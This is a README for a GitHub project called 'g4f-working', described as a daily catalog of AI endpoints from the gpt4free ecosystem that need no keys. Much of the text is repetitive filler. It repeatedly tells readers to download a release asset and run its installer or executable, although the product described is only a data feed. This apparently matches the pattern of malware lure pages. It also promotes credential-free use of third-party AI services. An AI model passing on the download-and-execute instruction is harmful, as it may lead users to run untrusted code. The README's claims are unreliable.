https://github.com/infos3ddesigner/g4f-working/releases

[![Release Downloads](https://img.shields.io/badge/downloads-releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/infos3ddesigner/g4f-working/releases)

![AI Monitoring Banner](https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1200&auto=format&fit=crop)

# g4f-working: Daily Online AI Providers Without Keys — Open Source

g4f-working is a daily-updated list of working no-auth AI providers and models from @xtekky/gpt4free. It helps developers, testers, and AI enthusiasts instantly find which models are currently online and accessible without any API keys, tokens, or cookies.

This repository collects, verifies, and presents the current landscape of auth-free AI services. It targets people who want rapid experimentation, lightweight demos, or offline-style testing without provisioning accounts or managing secrets. The data is refreshed every day to reflect uptime changes, new providers, and model updates.

The project is open source. It aims to be reliable, reproducible, and easy to extend. You can use the data to power dashboards, test harnesses, or quick-start demos in your own tooling. The model list comes from a broader ecosystem known as gpt4free, curated for no-auth access and straightforward deployment.

Overview of the core idea
- Watch a broad set of AI providers that expose public endpoints without API keys.
- Validate that a host, endpoint, or model is online and reachable.
- Track which models are usable today and which are temporarily offline.
- Offer a simple data feed you can import into your own apps, tests, or dashboards.
- Provide a path to automation so you can keep your experiments up to date with minimal effort.

This README explains what the project is, how it works, how to use it, and how to contribute. It also details the daily update workflow, data formats, and release process. The content below is structured to be friendly to developers, testers, data engineers, and AI researchers alike.

Table of contents
- What g4f-working is
- Why this project matters
- How it fits with gpt4free and the AI tooling ecosystem
- Data model and schema
- How the daily update works
- How to use the data
- How to contribute
- Testing and quality assurance
- Automation and CI
- Security and privacy considerations
- Roadmap and future plans
- Versioning and releases
- Licensing
- Community and support

What g4f-working is
g4f-working is a curated catalog of auth-free AI providers and models that are currently online and usable without credentials. It serves as a quick-access reference for developers who want to try models in real time, without signing up for keys or buying access. The project sources data from the broader no-auth AI ecosystem, especially components and providers within the gpt4free family. Each entry includes the provider name, model name, endpoint URL, any notable caveats, and a snapshot timestamp.

The catalog is updated daily. A daily update ensures the list reflects ongoing uptime, outages, and new entrants. The update process runs automatically and checks each provider against a lightweight connectivity test. This keeps latency measurements and availability statuses fresh. The end result is a compact, readable feed you can pull into your own apps or dashboards.

Why this project matters
- Speed: You can validate ideas quickly with working models that require no keys or tokens.
- Reproducibility: A daily-updated feed reduces drift between what you test locally and what is publicly accessible.
- Transparency: It makes it easy to see what’s online, what’s offline, and how the landscape evolves over time.
- Low friction: No API keys, no OAuth, no cookies. You can experiment with minimal setup.

How this project fits with the larger AI tooling ecosystem
- The gpt4free family provides various no-auth or low-friction AI options. g4f-working focuses on the subset that currently works and is reachable without credentials.
- It complements other AI directories by offering daily status and explicit uptime signals rather than just static lists.
- It can feed dashboards, CI tests, and demo environments where signing up for keys would slow things down.
- It supports automation workflows to monitor provider health, compare latency, and track model availability trends.

Data model and schema
The data feed is designed to be simple to consume but expressive enough to be useful. Each entry in the daily catalog typically includes:
- id: A stable, unique identifier for the provider-model pair.
- provider: The name of the provider as exposed by the endpoint (e.g., a specific no-auth service).
- model: The model name or API surface exposed by the provider.
- endpoint: The base URL or path where requests should be directed.
- status: An at-a-glance status indicator (online, limited, offline).
- latency_ms: Measured latency in milliseconds for a basic, lightweight inference test.
- last_checked: Timestamp of the last health check.
- notes: Any special conditions, such as rate limits, required payload formats, or caveats for usage.
- region: Optional geographic region if available, useful for latency analysis.
- protocol: WebSocket, HTTP/HTTPS, or other transport used for interaction.
- auth_required: A boolean flag indicating whether any authentication is required (for this catalog, typically false).
- source: The original provider URL or manifest used to validate the entry.
- tags: A small set of tags to help filtering (e.g., text-generation, open-source, no-api-key).

The daily feed is exposed in a machine-friendly format (JSON) and a human-friendly format (HTML page) to cover both automation and quick manual review. The JSON structure keeps fields stable so downstream apps can ingest it without heavy parsing logic. The HTML view is designed for quick browsing and manual testing.

How the daily update works
The daily update is a focused, repeatable process designed to keep the catalog fresh and trustworthy. It emphasizes determinism, speed, and correctness.

- Discovery: The update pulls a list of candidate providers from the gpt4free ecosystem and related No-Auth sources. This step identifies potential entries for testing.
- Validation: Each candidate is subjected to a connectivity check. The test ensures the endpoint responds to a minimal, safe prompt and returns a reasonable response within a threshold latency.
- Normalization: The results are normalized to the common data model. Provider names, model identifiers, and endpoint formats are standardized.
- Deduplication: Duplicates across providers are merged if they point to the same underlying model and endpoint. If there are distinct offerings that look similar, they remain separate entries with clear notes.
- Ranking and filtering: Online entries are prioritized. Entries with flaky latency or partial availability may be flagged as limited. The system can apply configurable filters (e.g., by latency, region, or model type).
- Timestamping: Each entry includes a last_checked timestamp to indicate when it was last verified.
- Output: The daily feed is produced in JSON and HTML. The JSON file serves as a programmatic feed, while the HTML page offers a human-friendly overview.
- Release integration: The daily feed is packaged and published as part of the release process so users have a stable artifact to pull.

Automation and continuous integration
The update process is automated through a lightweight pipeline. It runs on a schedule (daily) and can be triggered on demand. The pipeline includes:
- A data fetch stage to collect candidate providers.
- A validation stage that executes a minimal inference against each endpoint.
- A normalization stage to produce consistent data structures.
- A packaging stage that exports daily.json, daily.html, and any supplementary artifacts (CSV, CSV-compact, etc.).
- A release stage that publishes new artifacts to the Releases page.

The repository emphasizes simplicity. The tooling is designed to be runnable on modest hardware. You can run the update locally to reproduce the daily feed, test your changes, or validate new providers before they join the daily catalog.

Usage: how to use the data
- For developers
  - Pull the daily feed into your app to show which models are online today.
  - Use the JSON feed as a source of truth for test harnesses and dashboards.
  - Build a small UI that allows users to filter by provider, region, latency, or model type.
  - Implement a refresh button that triggers the update workflow and immediately reflects changes.

- For testers
  - Use the status flags to determine which models to run tests against first.
  - Compare latency across providers to pick targets for performance experiments.
  - Inspect notes for caveats like rate limits or usage constraints.

- For AI researchers
  - Study how the landscape evolves as new providers enter the space or drop offline.
  - Analyze latency trends and regional coverage to understand the no-auth ecosystem better.
  - Correlate provider uptime with broader network conditions to identify potential bottlenecks.

- Data consumers and integrations
  - Import daily.json into dashboards built with your preferred frontend framework.
  - Convert daily.csv for compatibility with legacy tools that require CSV input.
  - Use the HTML view for quick manual review during demos or ad-hoc testing sessions.

Getting started: download and run the latest release
To get started, download the latest release asset from the official releases page and execute it. The asset contains the pre-packaged daily feed plus a small utility to verify and explore the data locally. The release page is designed to be the single source of truth for all artifacts you may need to run or test the catalog on your machine.

For the full asset list and to download the latest release, visit the releases page here: https://github.com/infos3ddesigner/g4f-working/releases. You will find a packaged artifact that includes the daily.json, daily.html, and a lightweight explorer tool. After you download the asset, run the installer or executable included in the package to set up the local environment. The release page is also a good place to read release notes and see what changed in the recent update.

If you want to review the releases more directly later, you can visit the same page again. See Releases page at https://github.com/infos3ddesigner/g4f-working/releases for downloads and details.

How to run locally (high-level steps)
- Prerequisites
  - A modern OS with a shell (Linux, macOS, Windows with a compatible shell).
  - Sufficient disk space to store the daily.json and related assets.
  - Basic network connectivity to reach public endpoints for testing.

- Steps
  - Step 1: Acquire the release asset from the link above. Download and execute the installer to set up the local environment.
  - Step 2: Run the built-in validator to fetch the latest daily.json and daily.html locally.
  - Step 3: Point your app to the local data feed, or serve the HTML from a simple static server for quick previews.
  - Step 4: Optionally run a local UI to filter providers and inspect latency metrics.

- Expected results
  - A local copy of daily.json containing the latest online no-auth models.
  - An HTML page that mirrors the daily catalog for quick human review.
  - A small helper utility to validate a subset of providers on demand.

- Customization
  - You can configure filters to focus on a subset of providers or models.
  - You can adjust latency thresholds to mark providers as online or degraded.
  - You can add new providers to the discovery list to expand the catalog.

Contributing: how to help
g4f-working welcomes contributions from developers, researchers, and testers. Your input can help improve data accuracy, add new providers, and refine the update workflow. Here are practical ways to contribute:

- Improve data quality
  - Propose more robust validation checks for endpoint health.
  - Add notes about edge cases, payload formats, or rate limits.
  - Suggest more precise region tagging or latency measurements.

- Add providers
  - Submit new no-auth providers that are currently online.
  - Include necessary metadata such as provider name, model, endpoint, and notes.
  - Provide a minimum viable health check to ensure the entry stays current.

- Improve tooling
  - Contribute improvements to the update pipeline for speed and reliability.
  - Add new output formats or dump formats for different downstream consumers.
  - Build small adapters to plug the data into dashboards or CI pipelines.

- Documentation and examples
  - Expand usage guides for developers and testers.
  - Add example apps that consume daily.json and render a dashboard.
  - Create tutorials showing how to run automated tests against the catalog.

- Testing and QA
  - Write unit tests for data normalization and endpoint validation.
  - Add integration tests that exercise the full daily update workflow.
  - Create reproducible scenarios for outages or latency spikes.

- Localization
  - Add translations for the human-readable HTML view to support a broader audience.
  - Provide locale-aware date formatting for last_checked timestamps.

- Community guidelines
  - Update contribution guidelines to reflect best practices.
  - Clarify how to report issues and how to propose new features.

- How to submit changes
  - Fork the repository and create a feature branch for your change.
  - Implement your changes with clear, minimal code.
  - Write a concise pull request description that explains the intent and impact.
  - Include tests or evidence that your change works as expected.
  - Submit the PR for review and work with maintainers to refine your patch.

Testing and quality assurance
Quality matters for a daily catalog that other projects rely on. The project emphasizes reproducibility and clarity. Testing and QA cover several areas:

- Data accuracy tests
  - Validate that each entry includes required fields.
  - Check that endpoints respond to a minimal inquiry within a defined latency window.
  - Ensure there are no malformed URLs and that domains resolve correctly.

- Update pipeline tests
  - Verify that the update script runs end-to-end without errors.
  - Ensure daily.json remains valid JSON after updates.
  - Confirm that daily.html renders without broken links.

- Performance tests
  - Track average latency across a representative subset of providers.
  - Monitor spikes in latency and correlate with network events.

- Regression tests
  - Run a subset of tests after each change to catch regressions early.
  - Maintain a changelog that records fixes and improvements.

- Accessibility and readability checks
  - Ensure the HTML view is accessible and readable.
  - Provide alt text for any images used in the HTML view.
  - Use clear labels and consistent styling for the UI components in the HTML page.

- Documentation checks
  - Keep usage instructions up to date with the latest workflow.
  - Ensure the contribution guidelines reflect current practices.

Automation and continuous integration
- CI pipeline
  - Lints and type checks on code and data schemas.
  - Runs the update process in a sandboxed environment.
  - Generates daily.json and daily.html, then validates them.
  - Archives artifacts to the Releases page with a changelog entry.

- Release automation
  - Each successful update creates a new release artifact.
  - Release notes summarize changes, provider additions, and notable outages.
  - The Releases page provides access to all historically verified snapshots.

Security and privacy considerations
- Public data, minimal risk
  - The catalog lists publicly accessible endpoints that do not require credentials.
  - No private tokens, API keys, or secrets are stored in the catalog.

- Data integrity
  - All entries are timestamped and validated.
  - Duplicates are minimized, and ambiguous entries are annotated.

- Responsible usage
  - Use the data for testing, exploration, and dashboarding.
  - Respect provider terms if any endpoint imposes usage constraints.

- Updates and provenance
  - Each entry includes a source field to trace back to the original provider page or manifest.
  - The daily update process is documented and auditable.

- Privacy considerations
  - No user data collection occurs through the catalog itself.
  - If you build applications using the feed, handle any user data you collect with care.

Roadmap and future plans
- Expand provider coverage
  - Include more no-auth options as they emerge in the ecosystem.
  - Track regional coverage to reveal geographic diversity.

- Improve health checks
  - Add more robust validation checks for content accuracy and model alignment.
  - Support additional test prompts that exercise core capabilities.

- Enrich data formats
  - Add more export formats such as Parquet for data science workflows.
  - Provide a streaming API to push updates to subscribers.

- UI enhancements
  - Build a lightweight demo UI for quick exploration of online models.
  - Add interactive filters for latency, region, and model type.

- Community features
  - Implement a discussion forum or issue board for reporting provider status.
  - Create a rating system for perceived reliability, based on user feedback.

- Documentation improvements
  - Expand tutorials and how-to guides.
  - Add a glossary of terms used in the catalog.

Changelog
- The project maintains a CHANGELOG to track changes across releases.
- Each entry includes the date, a brief summary of changes, the impact on users, and any migration notes if needed.
- Users can review the changelog to understand how the daily feed evolved over time and to plan any necessary adjustments in their downstream tooling.

Versioning and releases
- Versioning follows semantic versioning where feasible.
- Each release includes a snapshot of daily.json, daily.html, and any ancillary artifacts.
- The Releases page is the canonical archive for all past releases.

Licensing
- This project is released under an open-source license.
- The license text is included in the repository so you can review usage rights, distribution conditions, and contribution terms.
- By using the data feed, you agree to the license terms and to respect the used endpoints and models.

Community and support
- The project welcomes community feedback. If you find issues or have ideas, open an issue in the repository.
- For discussions and quick questions, engage in community channels if provided by the project maintainers.
- You can also contribute by submitting improvements to the update pipeline, data quality, or the documentation.

Releases and download details
- The primary way to obtain the latest daily data and tooling is through the Releases page.
- The release package contains pre-built artifacts for quick local setup plus documentation on how to use them.
- For the latest changes, read the release notes that accompany each artifact.

Note on the Releases link usage
- The release link above is the primary source of downloadable assets. For setup, download the asset and execute it. Visit the Releases page to obtain the latest release and review what is included in the package.

Second usage of the release link
- See Releases page at https://github.com/infos3ddesigner/g4f-working/releases to download artifacts, read release notes, and verify the current state of the daily catalog.

Appendix: naming conventions and glossary
- Provider: The organization or project offering a no-auth model.
- Model: The specific AI model or API surface exposed by a provider.
- Endpoint: The URL or path to which requests are directed.
- No-auth: Access that does not require credentials, API keys, tokens, or cookies.
- Daily feed: The curated, up-to-date snapshot of online providers and models.
- Latency: The time taken to complete a basic inference test.
- Last checked: The timestamp when the provider was last validated.

Appendix: sample data structure (reference)
- id: g4f_provider_a_model_x
- provider: ExampleProvider
- model: ModelX
- endpoint: https://api.exampleprovider.com/v1/modelx
- status: online
- latency_ms: 128
- last_checked: 2025-08-13T12:00:00Z
- notes: Public endpoint; supports text-generation with a simple prompt.
- region: us-east
- protocol: https
- auth_required: false
- source: https://provider.example.com/docs
- tags: [text-generation, no-api-key, open-source]

Thank you for engaging with g4f-working. The catalog is built to be practical, current, and useful for a broad audience, from coders to researchers to product testers. The daily cadence keeps the data fresh, and the open-source nature invites collaboration and improvement.